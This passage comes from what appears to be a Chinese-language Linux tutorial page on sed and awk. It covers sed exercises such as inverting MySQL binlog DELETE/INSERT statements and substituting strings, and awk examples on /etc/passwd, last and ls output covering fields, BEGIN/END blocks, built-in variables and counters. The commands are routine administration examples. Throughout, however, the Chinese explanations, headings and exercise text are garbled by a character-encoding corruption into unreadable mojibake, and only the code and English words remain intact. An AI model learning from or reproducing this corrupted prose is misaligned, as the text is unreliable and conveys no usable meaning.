fromâ€</li><li>å°†â€œSETâ€æ›¿æ¢ä¸ºâ€œwhereâ€</li><li>å°†â€œWHEREâ€æ›¿æ¢ä¸ºâ€œsetâ€</li><li>å°†â€œ@1â€æ›¿æ¢ä¸ºâ€œidâ€</li><li>å°†â€œ@2â€æ›¿æ¢ä¸ºâ€œnameâ€</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@client0 ~]# sed '3p' mysqlbinlog.row</span><br><span class="line">[root@client0 ~]# sed -n '3p' mysqlbinlog.row</span><br><span class="line">[root@client0 ~]# sed -n '1,5p' mysqlbinlog.row</span><br><span class="line">[root@client0 ~]# sed -n '$p' mysqlbinlog.row</span><br><span class="line">[root@client0 ~]# sed -n '30,$p' mysqlbinlog.row</span><br><span class="line">[root@client0 ~]# sed -n '/BEGIN/p' mysqlbinlog.row</span><br><span class="line">[root@client0 ~]# sed -n '/COMMIT/p' mysqlbinlog.row</span><br><span class="line">[root@client0 ~]# sed '&#123;s/### //;s@\/\*.*\*\/@@;s/DELETE FROM/insert into/;s/INSERT INTO/delete from/;s/SET/where/;s/WHERE/set/;s/@1/id/;s/@2/name/&#125;' mysqlbinlog.row</span><br></pre></td></tr></table></figure><h4 id="è¯¾å ‚ç»ƒä¹ -1"><a href="#è¯¾å ‚ç»ƒä¹ -1" class="headerlink" title="è¯¾å ‚ç»ƒä¹ "></a>è¯¾å ‚ç»ƒä¹ </h4><ol><li>å°†192.168.1.1æ›¿æ¢æˆ192.168.2.2</li><li>å°†192.168.1.1æ›¿æ¢æˆ192.188.5.1</li><li>å°†192.168.1.1æ›¿æ¢æˆ192.192.192.1</li><li>å°†hello,babayä¸­babayåé¢è¿½åŠ â€,mybabayâ€</li><li>å°†hello,babayä¸­helloåé¢è¿½åŠ â€,mybabayâ€</li><li>å°†hello,babayæ›¿æ¢ä¸ºâ€hello1hello2hello3,babayâ€</li><li>å°†/tmp/shadowçš„å†…å®¹è¿½åŠ åˆ°/tmp/passwdä¸­ä»¥rootå¼€å¤´çš„è¡Œçš„åé¢</li><li>å°†/tmp/passwdä¸­ä»¥rootå¼€å¤´çš„è¡Œå’Œåé¢çš„2è¡Œå†™å…¥/tmp/shadow</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[root@client0 ~]<span class="comment"># echo 192.168.1.1|sed 's/\(.*\)1.1/\12.2/'</span></span><br><span class="line">192.168.2.2</span><br><span class="line">[root@client0 ~]<span class="comment"># echo 192.168.1.1|sed 's/\(.*\)168.1\(.*\)/\1188.5\2/'</span></span><br><span class="line">192.188.5.1</span><br><span class="line">[root@client0 ~]<span class="comment"># echo 192.168.1.1|sed 's/\(.*\)168.1\(.*\)/\1\1\11/'</span></span><br><span class="line">192.192.192.1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@client0 ~]<span class="comment"># echo hello,babay|sed 's/babay/&amp;,mybabay/'</span></span><br><span class="line">hello,babay,mybabay</span><br><span class="line">[root@client0 ~]<span class="comment"># echo hello,babay|sed 's/hello/&amp;,mybabay/'</span></span><br><span class="line">hello,mybabay,babay</span><br><span class="line">[root@client0 ~]<span class="comment"># echo hello,babay|sed 's/hello/&amp;1&amp;2&amp;3/'</span></span><br><span class="line">hello1hello2hello3,babay</span><br><span class="line"></span><br><span class="line">[root@client0 ~]<span class="comment"># sed '/^root/r /tmp/shadow' /tmp/passwd</span></span><br><span class="line">[root@client0 ~]<span class="comment"># sed '/^root/,+2w /tmp/shadow' /tmp/passwd</span></span><br></pre></td></tr></table></figure><h4 id="è¯¾åä¹ é¢˜"><a href="#è¯¾åä¹ é¢˜" class="headerlink" title="è¯¾åä¹ é¢˜"></a>è¯¾åä¹ é¢˜</h4><pre><code>1. å°†selinuxè®¾ç½®æˆå¼€æœºå…³é—­çŠ¶æ€ã€‚ç”¨sedå®Œæˆ2. è®¾ç½®å½“å‰ç”¨æˆ·çš„umaskå€¼æ°¸ä¹…ç”Ÿæ•ˆä¸º033 ~/.bashrcã€‚ç”¨sedå®Œæˆ3. ç”¨è„šæœ¬å®ç°è‡ªåŠ¨åŒ–æ­å»ºDNSæœåŠ¡å™¨ï¼Œå¹¶è‡ªåŠ¨åŒ–é…ç½®è§£æï¼Œè‡ªåŠ¨åŒ–æµ‹è¯•ã€‚</code></pre><h2 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h2><h3 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h3><p>awkæ˜¯ä¸€ä¸ªå¼ºå¤§çš„æ–‡æœ¬åˆ†æå·¥å…·ï¼Œç›¸å¯¹äºgrepçš„æŸ¥æ‰¾ï¼Œsedçš„ç¼–è¾‘ï¼Œawkåœ¨å…¶å¯¹æ•°æ®åˆ†æå¹¶ç”ŸæˆæŠ¥å‘Šæ—¶ï¼Œæ˜¾å¾—å°¤ä¸ºå¼ºå¤§ã€‚ç®€å•æ¥è¯´awkå°±æ˜¯æŠŠæ–‡ä»¶é€è¡Œçš„è¯»å…¥ï¼Œä»¥ç©ºæ ¼ä¸ºé»˜è®¤åˆ†éš”ç¬¦å°†æ¯è¡Œåˆ‡ç‰‡ï¼Œåˆ‡å¼€çš„éƒ¨åˆ†å†è¿›è¡Œå„ç§åˆ†æå¤„ç†ã€‚</p><p>awkæœ‰3ä¸ªä¸åŒç‰ˆæœ¬: awkã€nawkå’Œgawkï¼Œæœªä½œç‰¹åˆ«è¯´æ˜ï¼Œä¸€èˆ¬æŒ‡gawkï¼Œgawk æ˜¯ AWK çš„ GNU ç‰ˆæœ¬ã€‚</p><p>awkå…¶åç§°å¾—è‡ªäºå®ƒçš„åˆ›å§‹äºº Alfred Aho ã€Peter Weinberger å’Œ Brian Kernighan å§“æ°çš„é¦–ä¸ªå­—æ¯ã€‚å®é™…ä¸Š AWK çš„ç¡®æ‹¥æœ‰è‡ªå·±çš„è¯­è¨€ï¼š AWK ç¨‹åºè®¾è®¡è¯­è¨€ ï¼Œ ä¸‰ä½åˆ›å»ºè€…å·²å°†å®ƒæ­£å¼å®šä¹‰ä¸ºâ€œæ ·å¼æ‰«æå’Œå¤„ç†è¯­è¨€â€ã€‚å®ƒå…è®¸æ‚¨åˆ›å»ºç®€çŸ­çš„ç¨‹åºï¼Œè¿™äº›ç¨‹åºè¯»å–è¾“å…¥æ–‡ä»¶ã€ä¸ºæ•°æ®æ’åºã€å¤„ç†æ•°æ®ã€å¯¹è¾“å…¥æ‰§è¡Œè®¡ç®—ä»¥åŠç”ŸæˆæŠ¥è¡¨ï¼Œè¿˜æœ‰æ— æ•°å…¶ä»–çš„åŠŸèƒ½ã€‚</p><h3 id="ä½¿ç”¨æ–¹æ³•"><a href="#ä½¿ç”¨æ–¹æ³•" class="headerlink" title="ä½¿ç”¨æ–¹æ³•"></a>ä½¿ç”¨æ–¹æ³•</h3><p>awk â€˜{pattern + action}â€™ {filenames}</p><p>å°½ç®¡æ“ä½œå¯èƒ½ä¼šå¾ˆå¤æ‚ï¼Œä½†è¯­æ³•æ€»æ˜¯è¿™æ ·ï¼Œå…¶ä¸­ pattern è¡¨ç¤º AWK åœ¨æ•°æ®ä¸­æŸ¥æ‰¾çš„å†…å®¹ï¼Œè€Œ action æ˜¯åœ¨æ‰¾åˆ°åŒ¹é…å†…å®¹æ—¶æ‰€æ‰§è¡Œçš„ä¸€ç³»åˆ—å‘½ä»¤ã€‚èŠ±æ‹¬å·ï¼ˆ{}ï¼‰ä¸éœ€è¦åœ¨ç¨‹åºä¸­å§‹ç»ˆå‡ºç°ï¼Œä½†å®ƒä»¬ç”¨äºæ ¹æ®ç‰¹å®šçš„æ¨¡å¼å¯¹ä¸€ç³»åˆ—æŒ‡ä»¤è¿›è¡Œåˆ†ç»„ã€‚ patternå°±æ˜¯è¦è¡¨ç¤ºçš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œç”¨æ–œæ æ‹¬èµ·æ¥ã€‚</p><p>awkè¯­è¨€çš„æœ€åŸºæœ¬åŠŸèƒ½æ˜¯åœ¨æ–‡ä»¶æˆ–è€…å­—ç¬¦ä¸²ä¸­åŸºäºæŒ‡å®šè§„åˆ™æµè§ˆå’ŒæŠ½å–ä¿¡æ¯ï¼ŒawkæŠ½å–ä¿¡æ¯åï¼Œæ‰èƒ½è¿›è¡Œå…¶ä»–æ–‡æœ¬æ“ä½œã€‚å®Œæ•´çš„awkè„šæœ¬é€šå¸¸ç”¨æ¥æ ¼å¼åŒ–æ–‡æœ¬æ–‡ä»¶ä¸­çš„ä¿¡æ¯ã€‚</p><p>é€šå¸¸ï¼Œawkæ˜¯ä»¥æ–‡ä»¶çš„ä¸€è¡Œä¸ºå¤„ç†å•ä½çš„ã€‚awkæ¯æ¥æ”¶æ–‡ä»¶çš„ä¸€è¡Œï¼Œç„¶åæ‰§è¡Œç›¸åº”çš„å‘½ä»¤ï¼Œæ¥å¤„ç†æ–‡æœ¬ã€‚</p><h3 id="è°ƒç”¨awk"><a href="#è°ƒç”¨awk" class="headerlink" title="è°ƒç”¨awk"></a>è°ƒç”¨awk</h3><p>æœ‰ä¸‰ç§æ–¹å¼è°ƒç”¨awk</p><ol><li>å‘½ä»¤è¡Œæ–¹å¼<br>awk [-F  field-separator]  â€˜commandsâ€™  input-file(s)</li></ol><p>å…¶ä¸­ï¼Œcommands æ˜¯çœŸæ­£awkå‘½ä»¤ï¼Œ[-FåŸŸåˆ†éš”ç¬¦]æ˜¯å¯é€‰çš„ã€‚ input-file(s) æ˜¯å¾…å¤„ç†çš„æ–‡ä»¶ã€‚</p><p>åœ¨awkä¸­ï¼Œæ–‡ä»¶çš„æ¯ä¸€è¡Œä¸­ï¼Œç”±åŸŸåˆ†éš”ç¬¦åˆ†å¼€çš„æ¯ä¸€é¡¹ç§°ä¸ºä¸€ä¸ªåŸŸã€‚é€šå¸¸ï¼Œåœ¨ä¸æŒ‡å-FåŸŸåˆ†éš”ç¬¦çš„æƒ…å†µä¸‹ï¼Œé»˜è®¤çš„åŸŸåˆ†éš”ç¬¦æ˜¯ç©ºæ ¼ã€‚</p><ol start="2"><li>shellè„šæœ¬æ–¹å¼</li></ol><p>å°†æ‰€æœ‰çš„awkå‘½ä»¤æ’å…¥ä¸€ä¸ªæ–‡ä»¶ï¼Œå¹¶ä½¿awkç¨‹åºå¯æ‰§è¡Œï¼Œç„¶åawkå‘½ä»¤è§£é‡Šå™¨ä½œä¸ºè„šæœ¬çš„é¦–è¡Œï¼Œä¸€éé€šè¿‡é”®å…¥è„šæœ¬åç§°æ¥è°ƒç”¨ã€‚</p><p>ç›¸å½“äºshellè„šæœ¬é¦–è¡Œçš„ï¼š#!/bin/sh</p><p>å¯ä»¥æ¢æˆï¼š#!/bin/awk</p><ol start="3"><li>å°†æ‰€æœ‰çš„awkå‘½ä»¤æ’å…¥ä¸€ä¸ªå•ç‹¬æ–‡ä»¶ï¼Œç„¶åè°ƒç”¨ï¼š<br>awk -f awk-script-file input-file(s)</li></ol><p>å…¶ä¸­ï¼Œ-fé€‰é¡¹åŠ è½½awk-script-fileä¸­çš„awkè„šæœ¬ï¼Œinput-file(s)è·Ÿä¸Šé¢çš„æ˜¯ä¸€æ ·çš„ã€‚</p><p>æœ¬ç« é‡ç‚¹ä»‹ç»å‘½ä»¤è¡Œæ–¹å¼ã€‚</p><h3 id="å…¥é—¨å®ä¾‹"><a href="#å…¥é—¨å®ä¾‹" class="headerlink" title="å…¥é—¨å®ä¾‹"></a>å…¥é—¨å®ä¾‹</h3><p>å‡è®¾last -n 5çš„è¾“å‡ºå¦‚ä¸‹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@www ~]# last -n 5 &lt;==ä»…å–å‡ºå‰äº”è¡Œ</span><br><span class="line">root     pts/1   192.168.1.100  Tue Feb 10 11:21   still logged in</span><br><span class="line">root     pts/1   192.168.1.100  Tue Feb 10 00:46 - 02:28  (01:41)</span><br><span class="line">root     pts/1   192.168.1.100  Mon Feb  9 11:41 - 18:30  (06:48)</span><br><span class="line">dmtsai   pts/1   192.168.1.100  Mon Feb  9 11:41 - 11:41  (00:00)</span><br><span class="line">root     tty1                   Fri Sep  5 14:09 - 14:10  (00:01)</span><br></pre></td></tr></table></figure><p>å¦‚æœåªæ˜¯æ˜¾ç¤ºæœ€è¿‘ç™»å½•çš„5ä¸ªå¸å·</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">last -n 5 | awk  <span class="string">'&#123;print $1&#125;'</span></span></span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">dmtsai</span><br><span class="line">root</span><br></pre></td></tr></table></figure><p>awkå·¥ä½œæµç¨‹æ˜¯è¿™æ ·çš„ï¼šè¯»å…¥æœ‰â€™\nâ€™æ¢è¡Œç¬¦åˆ†å‰²çš„ä¸€æ¡è®°å½•ï¼Œç„¶åå°†è®°å½•æŒ‰æŒ‡å®šçš„åŸŸåˆ†éš”ç¬¦åˆ’åˆ†åŸŸï¼Œå¡«å……åŸŸï¼Œ$0åˆ™è¡¨ç¤ºæ‰€æœ‰åŸŸ,$1è¡¨ç¤ºç¬¬ä¸€ä¸ªåŸŸ,$nè¡¨ç¤ºç¬¬nä¸ªåŸŸã€‚é»˜è®¤åŸŸåˆ†éš”ç¬¦æ˜¯â€ç©ºç™½é”®â€ æˆ– â€œ[tab]é”®â€,æ‰€ä»¥$1è¡¨ç¤ºç™»å½•ç”¨æˆ·ï¼Œ$3è¡¨ç¤ºç™»å½•ç”¨æˆ·ip,ä»¥æ­¤ç±»æ¨ã€‚</p><p>å¦‚æœåªæ˜¯æ˜¾ç¤º/etc/passwdçš„è´¦æˆ·</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">cat /etc/passwd |awk  -F <span class="string">':'</span>  <span class="string">'&#123;print $1&#125;'</span>  </span></span><br><span class="line">root</span><br><span class="line">daemon</span><br><span class="line">bin</span><br><span class="line">sys</span><br></pre></td></tr></table></figure><p>è¿™ç§æ˜¯awk+actionçš„ç¤ºä¾‹ï¼Œæ¯è¡Œéƒ½ä¼šæ‰§è¡Œaction{print $1}ã€‚</p><p>-FæŒ‡å®šåŸŸåˆ†éš”ç¬¦ä¸ºâ€™:â€™ã€‚</p><p>å¦‚æœåªæ˜¯æ˜¾ç¤º/etc/passwdçš„è´¦æˆ·å’Œè´¦æˆ·å¯¹åº”çš„shell,è€Œè´¦æˆ·ä¸shellä¹‹é—´ä»¥tabé”®åˆ†å‰²</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">cat /etc/passwd |awk  -F <span class="string">':'</span>  <span class="string">'&#123;print $1"\t"$7&#125;'</span></span></span><br><span class="line">root    /bin/bash</span><br><span class="line">daemon  /bin/sh</span><br><span class="line">bin     /bin/sh</span><br><span class="line">sys     /bin/sh</span><br></pre></td></tr></table></figure><p>å¦‚æœåªæ˜¯æ˜¾ç¤º/etc/passwdçš„è´¦æˆ·å’Œè´¦æˆ·å¯¹åº”çš„shell,è€Œè´¦æˆ·ä¸shellä¹‹é—´ä»¥é€—å·åˆ†å‰²,è€Œä¸”åœ¨æ‰€æœ‰è¡Œæ·»åŠ åˆ—åname,shell,åœ¨æœ€åä¸€è¡Œæ·»åŠ â€blue,/bin/noshâ€ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd |awk  -F ':'  'BEGIN &#123;print "name,shell"&#125;  &#123;print $1","$7&#125; END &#123;print "blue,/bin/nosh"&#125;'</span><br><span class="line">name,shell</span><br><span class="line">root,/bin/bash</span><br><span class="line">daemon,/bin/sh</span><br><span class="line">bin,/bin/sh</span><br><span class="line">sys,/bin/sh</span><br><span class="line">....</span><br><span class="line">blue,/bin/nosh</span><br></pre></td></tr></table></figure><p>awkå·¥ä½œæµç¨‹æ˜¯è¿™æ ·çš„ï¼šå…ˆæ‰§è¡ŒBEGINGï¼Œç„¶åè¯»å–æ–‡ä»¶ï¼Œè¯»å…¥æœ‰/næ¢è¡Œç¬¦åˆ†å‰²çš„ä¸€æ¡è®°å½•ï¼Œç„¶åå°†è®°å½•æŒ‰æŒ‡å®šçš„åŸŸåˆ†éš”ç¬¦åˆ’åˆ†åŸŸï¼Œå¡«å……åŸŸï¼Œ$0åˆ™è¡¨ç¤ºæ‰€æœ‰åŸŸ,$1è¡¨ç¤ºç¬¬ä¸€ä¸ªåŸŸ,$nè¡¨ç¤ºç¬¬nä¸ªåŸŸ,éšåå¼€å§‹æ‰§è¡Œæ¨¡å¼æ‰€å¯¹åº”çš„åŠ¨ä½œactionã€‚æ¥ç€å¼€å§‹è¯»å…¥ç¬¬äºŒæ¡è®°å½•Â·Â·Â·Â·Â·Â·ç›´åˆ°æ‰€æœ‰çš„è®°å½•éƒ½è¯»å®Œï¼Œæœ€åæ‰§è¡ŒENDæ“ä½œã€‚</p><p>æœç´¢/etc/passwdæœ‰rootå…³é”®å­—çš„æ‰€æœ‰è¡Œ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">awk -F: <span class="string">'/root/'</span> /etc/passwd</span></span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure><p>è¿™ç§æ˜¯patternçš„ä½¿ç”¨ç¤ºä¾‹ï¼ŒåŒ¹é…äº†pattern(è¿™é‡Œæ˜¯root)çš„è¡Œæ‰ä¼šæ‰§è¡Œaction(æ²¡æœ‰æŒ‡å®šactionï¼Œé»˜è®¤è¾“å‡ºæ¯è¡Œçš„å†…å®¹)ã€‚</p><p>æœç´¢æ”¯æŒæ­£åˆ™ï¼Œä¾‹å¦‚æ‰¾rootå¼€å¤´çš„: awk -F: â€˜/^root/â€˜ /etc/passwd</p><p>æœç´¢/etc/passwdæœ‰rootå…³é”®å­—çš„æ‰€æœ‰è¡Œï¼Œå¹¶æ˜¾ç¤ºå¯¹åº”çš„shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> awk -F: <span class="string">'/root/&#123;print $7&#125;'</span> /etc/passwd             </span></span><br><span class="line">/bin/bash</span><br></pre></td></tr></table></figure><p>è¿™é‡ŒæŒ‡å®šäº†action{print $7}</p><h3 id="awkå†…ç½®å˜é‡"><a href="#awkå†…ç½®å˜é‡" class="headerlink" title="awkå†…ç½®å˜é‡"></a>awkå†…ç½®å˜é‡</h3><p>awkæœ‰è®¸å¤šå†…ç½®å˜é‡ç”¨æ¥è®¾ç½®ç¯å¢ƒä¿¡æ¯ï¼Œè¿™äº›å˜é‡å¯ä»¥è¢«æ”¹å˜ï¼Œä¸‹é¢ç»™å‡ºäº†æœ€å¸¸ç”¨çš„ä¸€äº›å˜é‡ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ARGC               å‘½ä»¤è¡Œå‚æ•°ä¸ªæ•°</span><br><span class="line">ARGV               å‘½ä»¤è¡Œå‚æ•°æ’åˆ—</span><br><span class="line">ENVIRON            æ”¯æŒé˜Ÿåˆ—ä¸­ç³»ç»Ÿç¯å¢ƒå˜é‡çš„ä½¿ç”¨</span><br><span class="line">FILENAME           awkæµè§ˆçš„æ–‡ä»¶å</span><br><span class="line">FNR                æµè§ˆæ–‡ä»¶çš„è®°å½•æ•°</span><br><span class="line">FS                 è®¾ç½®è¾“å…¥åŸŸåˆ†éš”ç¬¦ï¼Œç­‰ä»·äºå‘½ä»¤è¡Œ -Fé€‰é¡¹</span><br><span class="line">NF                 æµè§ˆè®°å½•çš„åŸŸçš„ä¸ªæ•°</span><br><span class="line">NR                 å·²è¯»çš„è®°å½•æ•°</span><br><span class="line">OFS                è¾“å‡ºåŸŸåˆ†éš”ç¬¦</span><br><span class="line">ORS                è¾“å‡ºè®°å½•åˆ†éš”ç¬¦</span><br><span class="line">RS                 æ§åˆ¶è®°å½•åˆ†éš”ç¬¦</span><br></pre></td></tr></table></figure><p>æ­¤å¤–,$0å˜é‡æ˜¯æŒ‡æ•´æ¡è®°å½•ã€‚$1è¡¨ç¤ºå½“å‰è¡Œçš„ç¬¬ä¸€ä¸ªåŸŸ,$2è¡¨ç¤ºå½“å‰è¡Œçš„ç¬¬äºŒä¸ªåŸŸ,â€¦â€¦ä»¥æ­¤ç±»æ¨ã€‚</p><p>ç»Ÿè®¡/etc/passwd:æ–‡ä»¶åï¼Œæ¯è¡Œçš„è¡Œå·ï¼Œæ¯è¡Œçš„åˆ—æ•°ï¼Œå¯¹åº”çš„å®Œæ•´è¡Œå†…å®¹:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">awk  -F <span class="string">':'</span>  <span class="string">'&#123;print "filename:" FILENAME ",linenumber:" NR ",columns:" NF ",linecontent:"$0&#125;'</span> /etc/passwd</span></span><br><span class="line">filename:/etc/passwd,linenumber:1,columns:7,linecontent:root:x:0:0:root:/root:/bin/bash</span><br><span class="line">filename:/etc/passwd,linenumber:2,columns:7,linecontent:daemon:x:1:1:daemon:/usr/sbin:/bin/sh</span><br><span class="line">filename:/etc/passwd,linenumber:3,columns:7,linecontent:bin:x:2:2:bin:/bin:/bin/sh</span><br><span class="line">filename:/etc/passwd,linenumber:4,columns:7,linecontent:sys:x:3:3:sys:/dev:/bin/sh</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨printfæ›¿ä»£print,å¯ä»¥è®©ä»£ç æ›´åŠ ç®€æ´ï¼Œæ˜“è¯»</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk  -F ':'  '&#123;printf("filename:%10s,linenumber:%s,columns:%s,linecontent:%s\n",FILENAME,NR,NF,$0)&#125;' /etc/passwd</span><br></pre></td></tr></table></figure><h3 id="printå’Œprintf"><a href="#printå’Œprintf" class="headerlink" title="printå’Œprintf"></a>printå’Œprintf</h3><p>awkä¸­åŒæ—¶æä¾›äº†printå’Œprintfä¸¤ç§æ‰“å°è¾“å‡ºçš„å‡½æ•°ã€‚</p><p>å…¶ä¸­printå‡½æ•°çš„å‚æ•°å¯ä»¥æ˜¯å˜é‡ã€æ•°å€¼æˆ–è€…å­—ç¬¦ä¸²ã€‚å­—ç¬¦ä¸²å¿…é¡»ç”¨åŒå¼•å·å¼•ç”¨ï¼Œå‚æ•°ç”¨é€—å·åˆ†éš”ã€‚å¦‚æœæ²¡æœ‰é€—å·ï¼Œå‚æ•°å°±ä¸²è”åœ¨ä¸€èµ·è€Œæ— æ³•åŒºåˆ†ã€‚è¿™é‡Œï¼Œé€—å·çš„ä½œç”¨ä¸è¾“å‡ºæ–‡ä»¶çš„åˆ†éš”ç¬¦çš„ä½œç”¨æ˜¯ä¸€æ ·çš„ï¼Œåªæ˜¯åè€…æ˜¯ç©ºæ ¼è€Œå·²ã€‚</p><p>printfå‡½æ•°ï¼Œå…¶ç”¨æ³•å’Œcè¯­è¨€ä¸­printfåŸºæœ¬ç›¸ä¼¼,å¯ä»¥æ ¼å¼åŒ–å­—ç¬¦ä¸²,è¾“å‡ºå¤æ‚æ—¶ï¼Œprintfæ›´åŠ å¥½ç”¨ï¼Œä»£ç æ›´æ˜“æ‡‚ã€‚</p><h3 id="awkç¼–ç¨‹"><a href="#awkç¼–ç¨‹" class="headerlink" title="awkç¼–ç¨‹"></a>awkç¼–ç¨‹</h3><h4 id="å˜é‡å’Œèµ‹å€¼"><a href="#å˜é‡å’Œèµ‹å€¼" class="headerlink" title="å˜é‡å’Œèµ‹å€¼"></a>å˜é‡å’Œèµ‹å€¼</h4><p>é™¤äº†awkçš„å†…ç½®å˜é‡ï¼Œawkè¿˜å¯ä»¥è‡ªå®šä¹‰å˜é‡ã€‚</p><p>ä¸‹é¢ç»Ÿè®¡/etc/passwdçš„è´¦æˆ·äººæ•°</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">awk '&#123;count++;print $0;&#125; END&#123;print "user count is ", count&#125;' /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">......</span><br><span class="line">user count is  40</span><br></pre></td></tr></table></figure><p>countæ˜¯è‡ªå®šä¹‰å˜é‡ã€‚ä¹‹å‰çš„action{}é‡Œéƒ½æ˜¯åªæœ‰ä¸€ä¸ªprint,å…¶å®printåªæ˜¯ä¸€ä¸ªè¯­å¥ï¼Œè€Œaction{}å¯ä»¥æœ‰å¤šä¸ªè¯­å¥ï¼Œä»¥;å·éš”å¼€ã€‚</p><p>è¿™é‡Œæ²¡æœ‰åˆå§‹åŒ–countï¼Œè™½ç„¶é»˜è®¤æ˜¯0ï¼Œä½†æ˜¯å¦¥å½“çš„åšæ³•è¿˜æ˜¯åˆå§‹åŒ–ä¸º0:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">awk 'BEGIN &#123;count=0;print "[start]user count is ", count&#125; &#123;count=count+1;print $0;&#125; END&#123;print "[end]user count is ", count&#125;' /etc/passwd</span><br><span class="line">[start]user count is  0</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">...</span><br><span class="line">[end]user count is  40</span><br></pre></td></tr></table></figure><p>ç»Ÿè®¡æŸä¸ªæ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶å ç”¨çš„å­—èŠ‚æ•°</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -l |awk 'BEGIN &#123;size=0;&#125; &#123;size=size+$5;&#125; END&#123;print "[end]size is ", size&#125;'</span><br><span class="line">[end]size is  8657198</span><br></pre></td></tr></table></figure><p>å¦‚æœä»¥Mä¸ºå•ä½æ˜¾ç¤º:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -l |awk 'BEGIN &#123;size=0;&#125; &#123;size=size+$5;&#125; END&#123;print "[end]size is ", size/1024/1024,"M"&#125;'</span><br><span class="line">[end]size is  8.25889 M</span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼Œç»Ÿè®¡ä¸åŒ…æ‹¬æ–‡ä»¶å¤¹çš„å­ç›®å½•ã€‚</p><h4 id="æ¡ä»¶è¯­å¥"><a href="#æ¡ä»¶è¯­å¥" class="headerlink" title="æ¡ä»¶è¯­å¥"></a>æ¡ä»¶è¯­å¥</h4><p>awkä¸­çš„æ¡ä»¶è¯­å¥æ˜¯ä»Cè¯­è¨€ä¸­å€Ÿé‰´æ¥çš„ï¼Œè§å¦‚ä¸‹å£°æ˜æ–¹å¼ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">if (expression) &#123;</span><br><span class="line">    statement;</span><br><span class="line">    statement;</span><br><span class="line">    ... ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (expression) &#123;</span><br><span class="line">    statement;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    statement2;</span><br><span 